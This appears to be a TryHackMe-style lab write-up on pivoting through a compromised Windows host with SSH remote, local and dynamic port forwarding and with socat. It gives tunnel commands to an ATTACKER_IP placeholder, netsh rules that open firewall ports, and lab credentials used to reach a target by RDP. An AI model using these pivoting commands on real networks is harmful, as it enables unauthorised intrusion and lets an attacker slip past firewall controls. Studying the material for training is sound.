# Port Forwarding

Most of lateral movement techniques showed require specific ports to be available for an attacker. In real-world networks, these ports may be blocked preventing from reaching SMB, RDP, WinRM or RPC ports.

To get around, we can use port forwarding techniques which consists of using any compromised host as a jump box to pivot to other hosts. Some machines may have different network permissions that host different services depending on what the target is.

***

### <mark style="color:green;">SSH Tunneling</mark>

SSH used to be a protocol only associated with Linux systems, Windows now ships with the OpenSSH client by default.

<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

Assume we have control over the PC-1 machine and we would like to use it as a pivot to access a port on another machine that we could not directly connect from the outside.&#x20;

We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an **SSH server**. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.

For this we can create a user specifically with `/bin/true` which means it won't get a normal shell. It just acts as a tunnel for our connection&#x20;

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

***

### <mark style="color:green;">SSH Remote Port Forwarding</mark>

Imagine a firewall policy that blocks outside connections from accessing port 3389. If the attacker has compromised PC-1 and it has access to port 3389, we can pivot using **remote port forwarding** to make it accessible from PC-1 (SSH Client) to the Attacker's machine (SSH Server).

<figure><img src="../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

To forward port 3389 back to our attacker's machine:

```
C:\> ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:3389 -N
```

One that is running we can go to the attacker's machine and RDP into forwarded port

```bash
xfreerdp /v:<TARGET_IP> /u:<User> /p:<Password>
```

***

### <mark style="color:green;">SSH Local Port Forwarding</mark>

**Local port forwarding** allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.

<figure><img src="../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

```
C:\> ssh tunneluser@<ATTACKER_IP> -L *:80:127.0.0.1:80 -N
```

Notice that we use the IP address 127.0.0.1 in the second socket, as from the attacker's PC perspective, that's the host that holds the port 80 to be forwarded.

Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). Administrative privileges are needed for this:

```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at `http://IP:80` and see the website published by the attacker's machine.

***

### <mark style="color:green;">Port Forwarding With Socat</mark>

If SSH is not available we can use socat to pivot. Though we need to transfer the executable file on the host to make it work, making it more detectable than SSH.

To access port 3389 on the server using PC-1 as a pivot point:

```
C:\>socat TCP4-LISTEN:3389,fork TCP4:TARGET_IP:3389
```

<figure><img src="../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

&#x20;As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:

```bash
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

To expose port 80 from the attacker's machine similar to pulling a port:

```
C:\>socat TCP4-LISTEN:80,fork TCP4:ATTACKER_IP:80
```

<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

|     SSH     | Remote Port Forwarding difference |             Socat             |
| :---------: | :-------------------------------: | :---------------------------: |
| Less likely |             Detection             |          More likely          |
|  Not needed |      Firewall Configurations      | Needed to open specific ports |

***

### <mark style="color:green;">Dynamic Port Forwarding and SOCKS</mark>

Allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a **SOCKS proxy**.

Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command:

```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

In this case, the SSH server will start a SOCKS proxy on port `9050`, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

We can also use any of the tools through the SOCKS proxy by using **proxychains.** Makes sure the configurations file `/etc/proxychains.conf` is pointing to any any connection to the same port used by SSH for the SOCKS proxy server

```
[ProxyList]
socks4  127.0.0.1 9050
```

To execute the command through proxychains:

```
proxychains curl http://pxeboot.za.tryhackme.com
```

***

***

<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

## Task 5

Our objective will be to connect via RDP to THMIIS . Initial credentials are given (assume we captured with admin access).&#x20;

User: jasmine.stanley

Password: G0O6Zd5aM

***

SSH to the credentials

<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

We need to connect through RDP but we will find that port 3389 has been filtered via firewall and not available directly. Using socat, we will forward the RDP port to make it available on THMJMP2 to connect from our attacker's machine.

```
C:\tools\socat>socat TCP4-LISTEN:<PORT>,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Normally, you'd have to add a firewall rule to allow traffic through the listener port, but THMJMP2 has its firewall disabled to make it easier.

Once the listener is active, we log into a user's account through RDP from the attacking machine

```bash
xfreerdp /v:THMJMP2.za.tryhackme.com:<PORT> /u:t1_thomas.moore /p:MyPazzw3rd2020
```

<figure><img src="../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>
